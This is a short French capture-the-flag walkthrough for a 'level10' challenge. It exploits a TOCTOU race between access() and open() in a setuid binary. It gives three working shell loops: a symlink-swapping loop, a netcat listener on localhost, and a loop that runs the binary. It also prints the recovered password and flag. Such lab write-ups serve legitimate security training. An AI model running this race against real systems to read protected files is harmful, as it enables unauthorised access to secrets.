Dans ce niveau on a encore un executable ```level10``` et on fichier ```token``` dont on a aucun acces

Quand on decompile l'executable on voit qu'il y a un appel a ```access()``` pour les droits

On va exploiter la faille appele toctou avec des scripts

Le premier sert a faire un lien symbolique en boucle pour passer apres ```access()``` :

```sh
while true; do
    rm -f /tmp/fakefile
    echo "fake content" > /tmp/fakefile
    sleep 0.0001
    rm -f /tmp/fakefile
    ln -s /home/user/level10/token /tmp/fakefile
    sleep 0.0001
done
```

Le second sert a filtrer le contenu lu en boucle (si c'est notre 'fake content' ou le contenu reel de token) :

```sh
while true; do
    output=$(nc -l localhost 6969)
    
    if [[ "$output" == ".*( )*." ]] || [[ "$output" == *"fake content"* ]]; then
        continue
    fi
    
    echo "$output"
    break
done
```

Et le troisieme sert uniquement a executer le prog ```level10``` :

```sh
while true; do
    /home/user/level10/level10 /tmp/fakefile 127.0.0.1
done
```
On Trouve finalement le mdp pour acceder a ```su flag10``` = ```woupa2yuojeeaaed06riuj63c```

Et avec la commande ```getflag``` on obteint le flag = ```feulo4b72j7edeahuete3no7c```